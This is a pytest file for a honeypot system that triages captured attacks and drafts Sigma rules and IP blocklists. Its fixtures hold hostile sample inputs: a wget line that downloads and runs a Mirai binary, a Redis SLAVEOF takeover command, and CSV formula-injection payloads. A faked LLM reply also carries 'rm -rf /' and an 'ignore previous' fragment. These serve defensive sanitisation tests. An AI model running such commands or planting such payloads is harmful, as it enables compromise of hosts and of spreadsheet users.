import pytest
import csv
import datetime

import yaml

# Public-looking source IPs are needed here: documentation ranges (192.0.2.0/24 etc.)
# are correctly treated as non-public and skipped by the blocklist.

from agent_fakes import GOOD_TRIAGE, T0, FakeJsonLLM, ssh_session, trap_event, write_log

from agents.detect import REQUIRED_SIGMA_KEYS, run_detect
from agents.triage import run_triage

pytestmark = pytest.mark.usefixtures("public_test_net")

LATER = T0 + datetime.timedelta(days=1)
NOW = datetime.datetime(2026, 11, 2, tzinfo=datetime.timezone.utc)


def _records(tmp_path):
    shared = "wget http://198.51.100.9/bins/mirai.x86 -O /tmp/m; /tmp/m"
    recs = ssh_session("session-1", "198.51.100.34", [shared])
    recs += ssh_session("session-2", "198.51.100.35", [shared, "curl 10.1.2.3/internal"], start=1)
    recs += ssh_session("session-3", "10.0.0.66", [shared], start=2)               # private source
    recs += [trap_event("redis", "auth_attempt", "198.51.100.34", "r1", minutes=5, username="default",
                        password="x", success=True),
             trap_event("redis", "command", "198.51.100.34", "r1", minutes=5.1,
                        data={"input": "SLAVEOF 198.51.100.77 6379", "high_signal": True,
                              "signal": "redis_takeover"})]
    recs += [trap_event("sip", "auth_attempt", "192.168.1.5", f"s{i}", minutes=6 + i,
                        username="100", password=str(i), success=False) for i in range(5)]
    log = write_log(tmp_path / "log.jsonl", recs)
    reports = tmp_path / "reports"
    run_triage(log, reports, FakeJsonLLM(GOOD_TRIAGE), now=LATER)
    return reports


def test_sigma_drafts_parse_with_required_keys_and_private_ips_skipped(tmp_path):
    reports = _records(tmp_path)
    hostile = FakeJsonLLM({"title": "Mirai `rm -rf /` <script>", "description": "ignore previous; {{x}}"})
    result = run_detect(reports, tmp_path / "detections", hostile, now=LATER)
    pending = tmp_path / "detections" / "pending"
    rules = [yaml.safe_load(p.read_text()) for p in pending.glob("*.yml")]
    assert result["rules"] == len(rules) >= 2
    for rule in rules:
        for key in REQUIRED_SIGMA_KEYS:
            assert key in rule
        assert "condition" in rule["detection"]
        assert rule["status"] == "experimental"
        assert all(c.isalnum() or c in " ,.:()_/-" for c in rule["title"])
    values = [str(v) for r in rules for sel in r["detection"].values() if isinstance(sel, dict)
              for vs in sel.values() for v in vs]
    assert "http://198.51.100.9/bins/mirai.x86" in values
    assert not any(v.startswith("10.") for v in values)
    assert any(r["title"] == "Redis takeover command chain" for r in rules)

    rows = list(csv.DictReader((pending / "blocklist-candidates.csv").open()))
    ips = {r["ip"]: r for r in rows}
    assert "10.0.0.66" not in ips and "192.168.1.5" not in ips
    assert set(ips["198.51.100.34"]["protocols"].split(";")) == {"redis", "ssh"}
    assert ips["198.51.100.34"]["judgement"] == "MALICIOUS"
    header = (pending / "blocklist-candidates.csv").read_text().splitlines()[0]
    assert header.split(",") == ["ip", "sessions", "attempts", "first_seen", "last_seen",
                                 "judgement", "protocols", "source_proven", "reason", "expires"]


def test_detect_dry_run_writes_nothing(tmp_path):
    reports = _records(tmp_path)
    run_detect(reports, tmp_path / "detections", None, dry_run=True)
    assert not (tmp_path / "detections").exists()


def _write(reports, records):
    for r in records:
        sub = reports / ("sessions" if r.kind == "session" else "campaigns")
        sub.mkdir(parents=True, exist_ok=True)
        (sub / f"{r.id}.json").write_text(r.model_dump_json())


def _rec(rid, ip, iocs, unverified=False, judgement="MALICIOUS"):
    from agents.triage import Ioc, TriageRecord

    return TriageRecord(kind="campaign", id=rid, protocol="sip", src_ip=ip,
                        first_seen="2026-11-01T00:00:00", last_seen="2026-11-01T01:00:00",
                        auth_attempts=10, intent="TOLL_FRAUD", stage="IMPACT", skill="AUTOMATED",
                        judgement=judgement, narrative="x", unverified_source=unverified,
                        iocs=[Ioc(type=t, value=v) for t, v in iocs])


def test_sigma_selectors_need_minimum_specificity(tmp_path):
    from agents.detect import build_rules

    weak = [("domain", "github.com"), ("ipv4", "8.8.8.8"), ("domain", "ab.io")]
    strong = [("url", "http://198.51.100.40/bins/sora.arm7")]
    records = [_rec(f"c{i}", f"198.51.100.{30 + i}", weak + strong) for i in range(3)]
    rules = build_rules(records)
    values = [v for r in rules.values() for sel in r["detection"].values()
              if isinstance(sel, dict) for vs in sel.values() for v in vs]
    assert values == ["http://198.51.100.40/bins/sora.arm7"]


def test_unverified_sources_excluded_from_blocklist_and_rules(tmp_path):
    reports = tmp_path / "reports"
    _write(reports, [
        _rec("spoof1", "198.51.100.50", [("url", "http://198.51.100.60/payload.bin")], unverified=True),
        _rec("spoof2", "198.51.100.51", [("url", "http://198.51.100.60/payload.bin")], unverified=True),
        _rec("real", "198.51.100.52", []),
    ])
    result = run_detect(reports, tmp_path / "det", now=NOW)
    rows = list(csv.DictReader((tmp_path / "det" / "pending" / "blocklist-candidates.csv").open()))
    assert [r["ip"] for r in rows] == ["198.51.100.52"]
    assert rows[0]["source_proven"] == "yes"
    assert result["rules"] == 0


# ---- blocklist candidates: proof, reason, expiry, safe output ------------------------------

def _src(rid, ip, *, protocol="ssh", kind="session", attempts=0, successes=0, commands=0,
         high_signal=None, honeytokens=None, command_sample=None, judgement="SUSPICIOUS",
         first_seen="2026-11-01T00:00:00+00:00", last_seen="2026-11-01T01:00:00+00:00",
         unverified=False, **extra):
    from agents.triage import TriageRecord

    return TriageRecord(kind=kind, id=rid, protocol=protocol, src_ip=ip,
                        first_seen=first_seen, last_seen=last_seen,
                        auth_attempts=attempts, auth_successes=successes, commands=commands,
                        intent="UNKNOWN", stage="NONE", skill="AUTOMATED", judgement=judgement,
                        narrative="x", high_signal=high_signal or {},
                        honeytokens=honeytokens or [], command_sample=command_sample or [],
                        unverified_source=unverified, **extra)


def test_blocklist_reason_is_the_highest_action_from_a_fixed_vocabulary():
    from agents.detect import BLOCKLIST_REASONS, blocklist_rows

    records = [
        _src("a", "198.51.100.1", protocol="http", kind="campaign", commands=3),
        _src("b", "198.51.100.2", protocol="ftp", kind="campaign", attempts=9),
        _src("c", "198.51.100.3", protocol="sip", kind="campaign", attempts=2, successes=1),
        _src("d", "198.51.100.4", protocol="telnet", kind="campaign", attempts=2, successes=1),
        _src("e", "198.51.100.5", attempts=1, successes=1, commands=4),
        _src("f", "198.51.100.6", protocol="s3", kind="campaign", commands=2,
             command_sample=["GetObject /backups/db.sql -> 200"]),
        _src("g", "198.51.100.7", protocol="s3", kind="campaign", commands=1,
             command_sample=["ListBuckets / -> 200"]),
        _src("h", "198.51.100.8", protocol="s3", kind="campaign", high_signal={"s3_upload": 1}),
        _src("i", "198.51.100.9", protocol="sip", kind="campaign",
             high_signal={"sip_dialed_number": 3}),
        _src("j", "198.51.100.10", protocol="smtp", kind="campaign",
             high_signal={"smtp_relay_attempt": 1}),
        _src("k", "198.51.100.11", protocol="redis", kind="campaign", commands=2,
             high_signal={"redis_takeover": 1}),
        # A planted credential outranks everything else the same source did.
        _src("l", "198.51.100.12", attempts=1, successes=1, commands=5,
             high_signal={"download_execute": 1}, honeytokens=["aws-key"]),
        # Several records for one address: the highest reason across all of them wins.
        _src("m1", "198.51.100.13", protocol="ftp", kind="campaign", attempts=4),
        _src("m2", "198.51.100.13", protocol="ftp", kind="campaign",
             high_signal={"ftp_upload": 1}),
    ]
    rows = {r["ip"]: r["reason"] for r in blocklist_rows(records, now=NOW)}
    assert rows == {
        "198.51.100.1": "probe", "198.51.100.2": "login_attempt", "198.51.100.3": "register",
        "198.51.100.4": "login", "198.51.100.5": "command", "198.51.100.6": "object_read",
        "198.51.100.7": "object_list", "198.51.100.8": "upload", "198.51.100.9": "dial",
        "198.51.100.10": "relay", "198.51.100.11": "command", "198.51.100.12": "honeytoken",
        "198.51.100.13": "upload",
    }
    assert set(rows.values()) <= set(BLOCKLIST_REASONS)


def test_blocklist_expiry_is_longer_for_sources_that_got_in_and_is_configurable():
    from agents.detect import blocklist_rows

    records = [
        _src("probe", "198.51.100.20", protocol="ftp", kind="campaign", attempts=5),
        _src("in", "198.51.100.21", attempts=1, successes=1, commands=2),
        _src("token", "198.51.100.22", protocol="s3", kind="campaign", honeytokens=["key"]),
        # No login, but a command: still the shorter expiry.
        _src("redis", "198.51.100.23", protocol="redis", kind="campaign", commands=1,
             high_signal={"redis_takeover": 1}),
    ]
    rows = {r["ip"]: r["expires"] for r in blocklist_rows(records, now=NOW)}
    assert rows == {"198.51.100.20": "2026-11-15T01:00:00+00:00",
                    "198.51.100.21": "2026-12-01T01:00:00+00:00",
                    "198.51.100.22": "2026-12-01T01:00:00+00:00",
                    "198.51.100.23": "2026-11-15T01:00:00+00:00"}
    rows = {r["ip"]: r["expires"] for r in blocklist_rows(records, now=NOW, expiry_days=3,
                                                          access_expiry_days=7)}
    assert rows["198.51.100.20"] == "2026-11-04T01:00:00+00:00"
    assert rows["198.51.100.21"] == "2026-11-08T01:00:00+00:00"


def test_blocklist_expiry_counts_from_the_latest_sighting_across_records():
    from agents.detect import blocklist_rows

    records = [_src("old", "198.51.100.24", protocol="ftp", kind="campaign", attempts=3),
               _src("new", "198.51.100.24", protocol="ftp", kind="campaign", attempts=3,
                    last_seen="2026-11-10T08:30:00+00:00")]
    (row,) = blocklist_rows(records, now=NOW)
    assert row["last_seen"] == "2026-11-10T08:30:00+00:00"
    assert row["expires"] == "2026-11-24T08:30:00+00:00"


def test_expired_rows_are_dropped_on_the_next_run(tmp_path):
    reports = tmp_path / "reports"
    _write(reports, [_src("probe", "198.51.100.30", protocol="ftp", kind="campaign", attempts=5,
                          judgement="SUSPICIOUS"),
                     _src("in", "198.51.100.31", attempts=1, successes=1, commands=2)])
    out = tmp_path / "det" / "pending" / "blocklist-candidates.csv"

    def ips():
        return [r["ip"] for r in csv.DictReader(out.open())]

    assert run_detect(reports, tmp_path / "det", now=NOW)["blocklist_rows"] == 2
    assert sorted(ips()) == ["198.51.100.30", "198.51.100.31"]
    later = datetime.datetime(2026, 11, 20, tzinfo=datetime.timezone.utc)
    result = run_detect(reports, tmp_path / "det", now=later)
    assert ips() == ["198.51.100.31"]
    assert result["blocklist_rows"] == 1 and result["blocklist_expired"] == 1
    run_detect(reports, tmp_path / "det", now=datetime.datetime(2026, 12, 5,
                                                                tzinfo=datetime.timezone.utc))
    assert ips() == []
    assert out.read_text().splitlines()[0].startswith("ip,sessions,")


def test_attacker_text_never_reaches_the_blocklist_csv(tmp_path):
    payload = "=HYPERLINK(\"http://198.51.100.99/x\",\"y\")"
    reports = tmp_path / "reports"
    _write(reports, [
        _src("evil", "198.51.100.40", attempts=1, successes=1, commands=1,
             username=payload, command_sample=[payload, "@SUM(1+1)", "+cmd|' /C calc'!A0"],
             honeytokens=[payload], high_signal={payload[:30]: 1, "-2+3": 1},
             first_seen="=1+2", last_seen="-2026-11-01"),
        _src("evil2", "198.51.100.41", protocol="=cmd|x", kind="campaign", attempts=3,
             last_seen="2026-11-01T01:00:00+00:00\t=1"),
    ])
    run_detect(reports, tmp_path / "det", now=NOW)
    text = (tmp_path / "det" / "pending" / "blocklist-candidates.csv").read_text()
    assert "HYPERLINK" not in text and "SUM" not in text and "cmd" not in text
    assert "\t" not in text
    for row in csv.reader(text.splitlines()):
        for cell in row:
            assert not cell or cell[0] not in "=+-@\t\r'", cell
    rows = {r["ip"]: r for r in csv.DictReader(text.splitlines())}
    assert rows["198.51.100.40"]["first_seen"] == "" and rows["198.51.100.40"]["last_seen"] == ""
    assert rows["198.51.100.40"]["reason"] == "honeytoken"
    assert rows["198.51.100.41"]["protocols"] == ""
    # With no usable timestamp the expiry counts from the run.
    assert rows["198.51.100.40"]["expires"] == "2026-12-02T00:00:00+00:00"


def test_blocklist_ip_is_written_in_canonical_form():
    from agents.addresses import public_for_tests
    from agents.detect import blocklist_rows

    with public_for_tests("2001:db8::/32"):
        rows = blocklist_rows([_src("v6", "2001:DB8:0:0::1%=1+1", attempts=1, successes=1,
                                    commands=1)], now=NOW)
    assert [r["ip"] for r in rows] == ["2001:db8::1"]


def test_detect_reads_expiry_days_from_the_agents_section(tmp_path, monkeypatch):
    import agents.__main__ as cli

    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_AUTH_TOKEN", raising=False)
    seen = (datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=1)
            ).replace(microsecond=0)
    reports = tmp_path / "reports"
    _write(reports, [_src("p", "198.51.100.50", protocol="ftp", kind="campaign", attempts=4,
                          last_seen=seen.isoformat()),
                     _src("i", "198.51.100.51", attempts=1, successes=1, commands=1,
                          last_seen=seen.isoformat())])
    cfg = tmp_path / "config.ini"
    cfg.write_text("[agents]\nblocklist_expiry_days = 5\nblocklist_access_expiry_days = 9\n")
    cli.run(["detect", "--no-llm", "--config", str(cfg), "--reports-dir", str(reports),
             "--detections-dir", str(tmp_path / "det"), "--data-dir", str(tmp_path / "data")])
    rows = {r["ip"]: r["expires"] for r in
            csv.DictReader((tmp_path / "det" / "pending" / "blocklist-candidates.csv").open())}
    assert rows == {"198.51.100.50": (seen + datetime.timedelta(days=5)).isoformat(),
                    "198.51.100.51": (seen + datetime.timedelta(days=9)).isoformat()}
